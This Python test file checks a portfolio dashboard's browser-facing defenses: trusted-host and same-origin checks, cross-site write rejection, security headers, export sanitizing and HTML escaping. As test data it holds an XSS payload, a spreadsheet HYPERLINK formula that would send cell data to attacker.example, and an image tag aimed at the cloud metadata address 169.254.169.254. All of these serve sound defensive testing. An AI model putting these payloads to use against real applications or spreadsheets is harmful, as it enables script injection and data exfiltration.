"""Browser-facing protections: Host/Origin checks, headers, export sanitizing, escaping."""

from __future__ import annotations

import contextlib
import io
import json
import re
import shutil
import subprocess
import unittest
import zipfile
from pathlib import Path
from unittest.mock import patch

from flask import Flask
from openpyxl import load_workbook

import app
from src.portfolio_dashboard.web_security import (
    CONTENT_SECURITY_POLICY,
    configured_trusted_hosts,
    install_web_security,
    is_same_origin,
    is_trusted_host,
    restrict_pdf_resource_access,
)

APP_JS = Path(__file__).resolve().parent / "static" / "app.js"
XSS_NAME = """Evil<img src=x onerror="alert(1)">'); alert(2); //"""


class TrustedHostTest(unittest.TestCase):
    def test_accepts_ip_literals_localhost_and_machine_names(self) -> None:
        for host in [
            "100.64.0.10:8050",
            "127.0.0.1",
            "[::1]:8050",
            "localhost:8050",
            "app.localhost",
            "homeserver",
            "homeserver:8050",
            "homeserver.local",
            "homeserver.tail1234.ts.net",
            "HOMESERVER.Tail1234.TS.NET.",
        ]:
            with self.subTest(host=host):
                self.assertTrue(is_trusted_host(host, machine_name="homeserver"))

    def test_rejects_rebinding_names(self) -> None:
        for host in ["", "attacker.example", "homeserver.attacker.example", "other.tail1234.ts.net", "127.0.0.1.nip.io"]:
            with self.subTest(host=host):
                self.assertFalse(is_trusted_host(host, machine_name="homeserver"))

    def test_configured_extras_match_exact_names_and_domains(self) -> None:
        extras = configured_trusted_hosts("dashboard.home.arpa, .lan")
        self.assertEqual(extras, ("dashboard.home.arpa", ".lan"))
        self.assertTrue(is_trusted_host("dashboard.home.arpa:8050", extras, machine_name="homeserver"))
        self.assertTrue(is_trusted_host("pi.lan", extras, machine_name="homeserver"))
        self.assertTrue(is_trusted_host("lan", extras, machine_name="homeserver"))
        self.assertFalse(is_trusted_host("evil-lan", extras, machine_name="homeserver"))

    def test_same_origin_compares_host_and_port(self) -> None:
        self.assertTrue(is_same_origin("http://100.64.0.10:8050", "100.64.0.10:8050"))
        self.assertTrue(is_same_origin("https://homeserver.tail1234.ts.net", "homeserver.tail1234.ts.net"))
        self.assertFalse(is_same_origin("http://100.64.0.10:8443", "100.64.0.10:8050"))
        self.assertFalse(is_same_origin("null", "localhost"))
        self.assertFalse(is_same_origin("http://attacker.example", "localhost"))


class RequestGuardTest(unittest.TestCase):
    def setUp(self) -> None:
        demo = Flask(__name__)
        install_web_security(demo, extra_hosts=())

        @demo.post("/write")
        def write() -> str:
            return "written"

        @demo.get("/read")
        def read() -> str:
            return "read"

        self.client = demo.test_client()

    def test_same_origin_and_non_browser_writes_are_allowed(self) -> None:
        self.assertEqual(self.client.post("/write", headers={"Origin": "http://localhost"}).status_code, 200)
        self.assertEqual(self.client.post("/write").status_code, 200)
        self.assertEqual(self.client.post("/write", headers={"Sec-Fetch-Site": "same-origin"}).status_code, 200)

    def test_cross_site_writes_are_rejected(self) -> None:
        for headers in [
            {"Origin": "http://attacker.example"},
            {"Origin": "null"},
            {"Sec-Fetch-Site": "cross-site"},
        ]:
            with self.subTest(headers=headers):
                self.assertEqual(self.client.post("/write", headers=headers).status_code, 403)

    def test_cross_site_reads_still_need_a_trusted_host(self) -> None:
        self.assertEqual(self.client.get("/read", headers={"Origin": "http://attacker.example"}).status_code, 200)
        self.assertEqual(self.client.get("/read", headers={"Host": "attacker.example"}).status_code, 400)

    def test_security_headers_are_added(self) -> None:
        response = self.client.get("/read")
        self.assertEqual(response.headers["Content-Security-Policy"], CONTENT_SECURITY_POLICY)
        self.assertIn("connect-src 'self'", CONTENT_SECURITY_POLICY)
        self.assertIn("frame-ancestors 'none'", CONTENT_SECURITY_POLICY)
        self.assertEqual(response.headers["X-Content-Type-Options"], "nosniff")
        self.assertEqual(response.headers["X-Frame-Options"], "DENY")


class DashboardGuardTest(unittest.TestCase):
    def test_cross_site_statement_upload_never_reaches_the_importer(self) -> None:
        with patch.object(app, "import_statement_path") as importer, app.app.test_client() as client:
            response = client.post(
                "/api/imports",
                data={"source": "manual", "file": (io.BytesIO(b"asset\n"), "trades.csv")},
                content_type="multipart/form-data",
                headers={"Origin": "http://attacker.example"},
            )
        self.assertEqual(response.status_code, 403)
        importer.assert_not_called()

    def test_rebinding_host_cannot_read_the_dashboard(self) -> None:
        with app.app.test_client() as client:
            response = client.get("/api/imports/status", headers={"Host": "attacker.example"})
        self.assertEqual(response.status_code, 400)

    def test_dashboard_responses_carry_security_headers(self) -> None:
        with app.app.test_client() as client:
            response = client.get("/__missing__")
        self.assertEqual(response.status_code, 404)
        self.assertEqual(response.headers["Content-Security-Policy"], CONTENT_SECURITY_POLICY)


class ExportSanitizingTest(unittest.TestCase):
    def test_xlsx_cells_starting_with_equals_stay_text(self) -> None:
        payload = '=HYPERLINK("http://attacker.example/?d="&A1,"Click")'
        output = app.build_xlsx_export({"Holdings": [["Asset", "Value"], [payload, 10]]})
        raw = output.getvalue()
        with zipfile.ZipFile(io.BytesIO(raw)) as archive:
            sheet_xml = "".join(
                archive.read(name).decode("utf-8") for name in archive.namelist() if name.startswith("xl/worksheets/")
            )
        self.assertNotIn("<f>", sheet_xml)
        cell = load_workbook(io.BytesIO(raw))["Holdings"]["A2"]
        self.assertEqual(cell.value, payload)
        self.assertNotEqual(cell.data_type, "f")

    def test_pdf_export_does_not_fetch_remote_images(self) -> None:
        from reportlab.lib import utils as reportlab_utils

        restrict_pdf_resource_access()
        requested: list[str] = []

        def record(name: str, *args: object, **kwargs: object) -> bytes:
            requested.append(name)
            raise OSError("network disabled in tests")

        tables = {"Holdings": [["Asset", "Value"], ['Fund <img src="http://169.254.169.254/x.png"/>', 10]]}
        # A rejected image may abort the PDF; it must never be fetched.
        with patch.object(reportlab_utils, "rlUrlRead", record), contextlib.suppress(OSError, ValueError):
            app.build_pdf_export(tables, "Report")
        self.assertEqual(requested, [])


class FrontendEscapingTest(unittest.TestCase):
    def setUp(self) -> None:
        self.source = APP_JS.read_text(encoding="utf-8")

    def test_no_inline_javascript_built_from_data(self) -> None:
        self.assertNotIn("onerror=", self.source)
        # escapeHtml inside a quoted JS string is decoded back before the handler runs.
        self.assertIsNone(re.search(r"""onclick="[^"]*'\$\{escapeHtml""", self.source))

    def test_statement_fields_are_escaped_in_table_markup(self) -> None:
        for field in ["asset", "isin", "symbol", "broker", "description", "date", "type_label"]:
            with self.subTest(field=field):
                self.assertIsNone(re.search(rf"<(?:td|span)[^>]*>\$\{{(?:p|r|row)\.{field}\b", self.source))

    def test_helpers_neutralize_markup_and_quotes(self) -> None:
        node = shutil.which("node")
        if node is None:
            self.skipTest("node is not installed")
        helpers = re.search(
            r"(    function escapeHtml\(value\).*?\n    function assetLogoHtml.*?\n    \})\n", self.source, re.DOTALL
        )
        self.assertIsNotNone(helpers)
        assert helpers is not None
        script = (
            helpers.group(1)
            + f"""
const name = {json.dumps(XSS_NAME)};
console.log(JSON.stringify({{
  handler: `onclick="fn(${{jsArg(name)}})"`,
  logo: assetLogoHtml(name, name),
  text: escapeHtml(name),
}}));
"""
        )
        result = subprocess.run([node, "-e", script], capture_output=True, text=True, check=True, timeout=30)
        output = json.loads(result.stdout)
        for value in output.values():
            self.assertNotIn("<img src=x", value)
            self.assertNotIn('"alert', value)
        # The handler argument decodes to one JSON string literal holding the raw name.
        attribute = output["handler"][len('onclick="fn(') : -len(')"')]
        decoded = (
            attribute.replace("&quot;", '"')
            .replace("&#39;", "'")
            .replace("&lt;", "<")
            .replace("&gt;", ">")
            .replace("&amp;", "&")
        )
        self.assertEqual(json.loads(decoded), XSS_NAME)
        self.assertIn("isin/Evil%3Cimg", output["logo"])
        self.assertIn('data-asset-logo data-logo-fallback="https://assets.parqet.com/logos/symbol/', output["logo"])


if __name__ == "__main__":
    unittest.main()
